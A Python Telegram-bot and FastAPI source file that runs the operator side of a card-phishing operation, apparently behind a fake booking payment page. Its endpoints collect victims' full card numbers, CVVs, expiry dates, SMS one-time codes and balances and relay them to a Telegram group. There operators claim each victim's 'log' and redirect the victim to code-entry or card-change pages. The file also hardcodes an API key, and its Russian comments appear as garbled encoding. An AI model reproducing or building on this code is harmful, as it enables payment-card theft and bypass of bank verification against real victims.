# bot.py - –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –æ–Ω–ª–∞–π–Ω –∏ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–µ–π HandyAPI
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI
import uvicorn
import asyncio
import httpx
import config
import sqlite3
import datetime
from contextlib import contextmanager

bot = Bot(token=config.TOKEN)
dp = Dispatcher()
app = FastAPI()

# API –∫–ª—é—á –∏ –±–∞–∑–æ–≤—ã–π URL –¥–ª—è HandyAPI
HANDYAPI_KEY = "HAS-0YH7P8rbGpwLRHq4gM0BX6K"
HANDYAPI_BASE_URL = "https://data.handyapi.com/bin/"

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
def init_db():
    with sqlite3.connect('logs.db') as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                session_id TEXT PRIMARY KEY,
                masked_pan TEXT,
                booking_id TEXT,
                client_id TEXT, 
                taken_by INTEGER,
                step TEXT DEFAULT 'full',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# –ö–æ–Ω—Ç–µ–∫—Å—Ç–Ω—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ë–î
@contextmanager
def get_db_connection():
    conn = sqlite3.connect('logs.db')
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–∞—Ä—Ç–µ —á–µ—Ä–µ–∑ HandyAPI
async def get_card_info(bin_number):
    """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–∞—Ä—Ç–µ –ø–æ BIN —á–µ—Ä–µ–∑ HandyAPI"""
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(
                f"{HANDYAPI_BASE_URL}{bin_number}",
                headers={"Authorization": f"Bearer {HANDYAPI_KEY}"}
            )
            
            if response.status_code == 200:
                data = response.json()
                
                # –ü–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥ —Å—Ç—Ä–∞–Ω—ã –∏–∑ –∫–æ–¥–∞ A2
                country_code = data.get("Country", {}).get("A2", "").upper()
                flag_emoji = get_country_flag_emoji(country_code)
                
                return {
                    "flag": flag_emoji,
                    "country": data.get("Country", {}).get("Name", "N/A").upper(),
                    "brand": data.get("Scheme", "N/A"),
                    "type": data.get("Type", "N/A"),
                    "level": data.get("CardTier", "N/A"),
                    "bank": data.get("Issuer", "N/A"),
                    "status": data.get("Status", "N/A"),
                    "success": True
                }
            else:
                return {"success": False, "error": f"HTTP {response.status_code}"}
                
    except Exception as e:
        return {"success": False, "error": str(e)}

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —ç–º–æ–¥–∑–∏ —Ñ–ª–∞–≥–∞ –ø–æ –∫–æ–¥—É —Å—Ç—Ä–∞–Ω—ã
def get_country_flag_emoji(country_code):
    """–ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ—Ç –∫–æ–¥ —Å—Ç—Ä–∞–Ω—ã –≤ —ç–º–æ–¥–∑–∏ —Ñ–ª–∞–≥–∞"""
    if len(country_code) != 2:
        return "üè¥"
    
    # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –±—É–∫–≤—ã –≤ —Ä–µ–≥–∏–æ–Ω–∞–ª—å–Ω—ã–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã
    flag_emoji = ''.join(chr(ord(c) + 127397) for c in country_code.upper())
    return flag_emoji

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–∞—Ä—Ç–µ
def format_card_info(card_info):
    """–§–æ—Ä–º–∞—Ç–∏—Ä—É–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–∞—Ä—Ç–µ –≤ –∫—Ä–∞—Å–∏–≤—ã–π —Ç–µ–∫—Å—Ç —Å —ç–º–æ–¥–∑–∏"""
    if not card_info.get("success"):
        return "‚ùå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å –∑–∞–ø—Ä–æ—Å–∞
    if card_info.get("status") != "SUCCESS":
        return f"‚ùå –°—Ç–∞—Ç—É—Å –∑–∞–ø—Ä–æ—Å–∞: {card_info.get('status', 'UNKNOWN')}"
    
    return (
        f"{card_info['flag']} {card_info['country']}\n"
        f"üè∑Ô∏è <b>Brand:</b> {card_info['brand']}\n"
        f"üí≥ <b>Type:</b> {card_info['type']}\n"
        f"‚≠ê <b>Level:</b> {card_info['level']}\n"
        f"üè¶ <b>Bank:</b> {card_info['bank']}\n"
    )

# –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞
@app.post("/notify")
async def notify(data: dict):
    try:
        session_id = data["sessionId"]
        masked_pan = data["maskedPan"]
        booking_id = data.get("bookingId", session_id[:8].upper())
        client_id = data["clientId"]
        step = data.get("step", "full")
        
        with get_db_connection() as conn:
            cursor = conn.cursor()
            
            if step == "card_number_only":
                # –ü–æ–ª—É—á–∞–µ–º BIN –∏–∑ –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã (–ø–µ—Ä–≤—ã–µ 6 —Ü–∏—Ñ—Ä)
                bin_number = masked_pan[:6]
                card_info = await get_card_info(bin_number)
                card_info_text = format_card_info(card_info)
                
                cursor.execute('''
                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, client_id, step, updated_at)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (session_id, masked_pan, booking_id, client_id, step, datetime.datetime.now()))
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üÜî #{booking_id} || #{client_id}\n"
                    f"üéØ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –∫–∞—Ä—Ç—É, –ø—Ä–∏–≥–æ—Ç–æ–≤–∏—Ç—å—Å—è!\n\n"
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n"
                    f"üîπ <code>{masked_pan}</code>\n"
                    f"üîπ <code>{card_with_spaces}</code>\n\n\n"
                    f"{card_info_text}\n\n"
                    f"‚è≥ –û–∂–∏–¥–∞–µ–º CVV –∏ expiry date..."
                )
                
                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML")
                
            elif step == "completed":
                cvv = data.get("cvv", "N/A")
                expire_date = data.get("expireDate", "N/A")
                
                cursor.execute('''
                    UPDATE logs 
                    SET masked_pan = ?, step = ?, updated_at = ?, client_id = ?
                    WHERE session_id = ?
                ''', (masked_pan, step, datetime.datetime.now(), client_id, session_id))
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üÜî #{booking_id} || #{client_id}\n"
                    f"üîî –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ–∂–∏–¥–∞–µ—Ç üîî\n\n"
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n\n"
                    f"üîπ <code>{masked_pan}</code>\n"
                    f"üîπ <code>{card_with_spaces}</code>\n\n"
                )
                
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="–í–∑—è—Ç—å –ª–æ–≥", callback_data=f"take:{session_id}")]
                ])
                
                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML", reply_markup=kb)
                
            else:
                cursor.execute('''
                    INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, client_id, step, updated_at)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (session_id, masked_pan, booking_id, client_id, "full", datetime.datetime.now()))
                
                card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                
                message_text = (
                    f"üÜî #{booking_id} || #{client_id}\n"
                    f"üîî –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ–∂–∏–¥–∞–µ—Ç üîî\n\n"
                    f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n\n"
                    f"üîπ <code>{masked_pan}</code>\n"
                    f"üîπ <code>{card_with_spaces}</code>\n\n"
                )
                
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="–í–∑—è—Ç—å –ª–æ–≥", callback_data=f"take:{session_id}")]
                ])
                
                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML", reply_markup=kb)

            conn.commit()

        return {"status": "ok"}
    
    except Exception as e:
        print(f"Error in /notify: {e}")
        return {"status": "error", "message": str(e)}, 500

@app.post("/balance-notify")
async def balance_notify(data: dict):
    session_id = data["sessionId"]
    balance = data["balance"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    booking_id = log['booking_id']
    client_id = log['client_id']

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"#{booking_id} || #{client_id}\n\n"
            f"‚úÖ –ë–∞–ª–∞–Ω—Å —é–∑–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω!\n\nüí∞ –°—É–º–º–∞: {balance} AED"
        )
    return {"status": "ok"}

@app.post("/sms-notify")
async def sms_notify(data: dict):
    session_id = data["sessionId"]
    sms = data["sms"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    booking_id = log['booking_id']
    client_id = log['client_id']

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"#{booking_id} || #{client_id}\n\n"
            f"‚úÖ –ö–æ–¥ —Å–º—Å –ø–æ–ª—É—á–µ–Ω!\n\nüî¢ –ö–æ–¥: {sms}"
        )
    return {"status": "ok"}

@app.post("/change-card-notify")
async def change_card_notify(data: dict):
    session_id = data["sessionId"]
    changed_card = data["changed_card"]
    changed_expire = data["changed_expire"]
    changed_cvv = data["changed_cvv"]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()

    booking_id = log['booking_id']
    client_id = log['client_id']

    if log and log['taken_by']:
        await bot.send_message(
            log['taken_by'],
            f"#{booking_id} || #{client_id}\n\n"
            f"‚úÖ –Æ–∑–µ—Ä –∏–∑–º–µ–Ω–∏–ª –∫–∞—Ä—Ç—É\n\nüîÑüí≥ –ù–æ–≤–∞—è –∫–∞—Ä—Ç–∞: {changed_card}\nüîÑüóìÔ∏è –ù–æ–≤—ã–π —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {changed_expire}\nüîÑüîí –ù–æ–≤—ã–π CVV: {changed_cvv}"
        )
    return {"status": "ok"}

# –í–∑—è—Ç—å –ª–æ–≥
@dp.callback_query(F.data.startswith("take:"))
async def take_log(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]

    with get_db_connection() as conn:
        cursor = conn.cursor()
        
        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
        if not log:
            await callback.answer("–õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", show_alert=True)
            return
            
        if log['taken_by']:
            await callback.answer("–≠—Ç–æ—Ç –ª–æ–≥ —É–∂–µ –∑–∞–Ω—è—Ç", show_alert=True)
            return

        cursor.execute('''
            UPDATE logs 
            SET taken_by = ?, updated_at = ?
            WHERE session_id = ?
        ''', (callback.from_user.id, datetime.datetime.now(), session_id))
        conn.commit()

        async with httpx.AsyncClient() as client:
            customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
            card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
            booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

        booking_id = log['booking_id'] or "N/A"
        client_id = log['client_id'] or "N/A"
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–∞—Ä—Ç–µ –¥–ª—è –ø–æ–ª–Ω–æ–≥–æ –Ω–æ–º–µ—Ä–∞
        full_pan = card.get('full_pan', '')
        if full_pan:
            bin_number = full_pan[:6]
            card_info = await get_card_info(bin_number)
            card_info_text = format_card_info(card_info)
        else:
            card_info_text = "‚ùå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"
        
        text = (
            f"–õ–æ–≥ #{booking_id} || #{client_id}\n\n"
            f"üí≥  –ö–∞—Ä—Ç–∞: <code>{full_pan}</code>\n"
            f"üóìÔ∏è  –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {card.get('expire_date')}\n"
            f"üîí  CVV: {card.get('cvv')}\n\n"
            f"üìä <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ:</b>\n"
            f"{card_info_text}\n\n"
            f"üë§  –ò–º—è: {customer.get('name')} {customer.get('surname')}\n"
            f"üìû  –ù–æ–º–µ—Ä: {customer.get('phone')}\n\n"
            f"üí∏  –°—É–º–º–∞: {booking.get('total_amount')}.00 AED"
        )

        management_kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="üí∞ –ë–∞–ª–∞–Ω—Å", callback_data=f"balance:{session_id}"),
                InlineKeyboardButton(text="üìû SMS", callback_data=f"sms:{session_id}")
            ],
            [
                InlineKeyboardButton(text="üîÑ –ò–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É", callback_data=f"change:{session_id}"),
                InlineKeyboardButton(text="‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞", callback_data=f"success:{session_id}")
            ],
            [
                InlineKeyboardButton(text="üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–Ω–ª–∞–π–Ω", callback_data=f"check_online:{session_id}")
            ]
        ])

        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=management_kb)
        
        new_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"–õ–æ–≥ –≤–∑—è–ª @{callback.from_user.username}", callback_data="already_taken")]
        ])
        
        await callback.message.edit_reply_markup(reply_markup=new_kb)
        await callback.answer()

# –ù–û–í–´–ô –û–ë–†–ê–ë–û–¢–ß–ò–ö: –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å–∞
@dp.callback_query(F.data.startswith("check_online:"))
async def check_online_status(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, booking_id, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
    
    booking_id = log['booking_id']
    client_id = log['client_id']

    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å —Å —Å–µ—Ä–≤–µ—Ä–∞
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get("online"):
                    current_page = data.get("currentPageDisplay", "Unknown")
                    
                    await callback.message.answer(
                        f"üÜî #{booking_id} || #{client_id}\n\n"
                        f"üü¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –û–ù–õ–ê–ô–ù\n\n"
                        f"üìç –¢–µ–∫—É—â–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: {current_page}\n"
                        f"‚è∞ –ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: —Ç–æ–ª—å–∫–æ —á—Ç–æ"
                    )
                else:
                    last_known_page = data.get("lastKnownPageDisplay", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                    last_seen = data.get("lastSeen", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                    
                    await callback.message.answer(
                        f"üÜî #{booking_id} || #{client_id}\n\n"
                        f"üî¥ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –û–§–§–õ–ê–ô–ù\n\n"
                        f"üìÑ –ü–æ—Å–ª–µ–¥–Ω—è—è –∏–∑–≤–µ—Å—Ç–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: {last_known_page}\n"
                        f"‚è∞ –ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {last_seen}"
                    )
            else:
                await callback.message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
                
    except Exception as e:
        print(f"Error checking online status: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")
    
    await callback.answer()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ë–∞–ª–∞–Ω—Å"
@dp.callback_query(F.data.startswith("balance:"))
async def handle_balance(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-balance", 
                                       json={"sessionId": session_id,
                                        "clientId": log['client_id']
                                        })
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –±–∞–ª–∞–Ω—Å–∞")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "SMS"
@dp.callback_query(F.data.startswith("sms:"))
async def handle_sms(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-sms", 
                                       json={"sessionId": session_id,
                                        "clientId": log['client_id']})
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–æ–¥–∞")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ò–∑–º–µ–Ω–∏—Ç—å –∫–∞—Ä—Ç—É"
@dp.callback_query(F.data.startswith("change:"))
async def handle_change(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-change", 
                                       json={"sessionId": session_id,
                                       "clientId": log['client_id']})
                                        
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∑–∞–º–µ–Ω—ã –∫–∞—Ä—Ç—ã")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

@dp.callback_query(F.data.startswith("success:"))
async def handle_success(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    with get_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT taken_by, client_id FROM logs WHERE session_id = ?', (session_id,))
        log = cursor.fetchone()
        
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(f"{config.SERVER_URL}/redirect-success", 
                                       json={"sessionId": session_id,
                                       "clientId": log['client_id']})
            
            if response.status_code == 200:
                 await callback.message.answer("‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞!")
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

async def main():
    init_db()
    bot_task = asyncio.create_task(dp.start_polling(bot))

    config_uvicorn = uvicorn.Config(app, host="0.0.0.0", port=8000, loop="asyncio")
    server = uvicorn.Server(config_uvicorn)
    server_task = asyncio.create_task(server.serve())

    await asyncio.gather(bot_task, server_task)

if __name__ == "__main__":
    asyncio.run(main())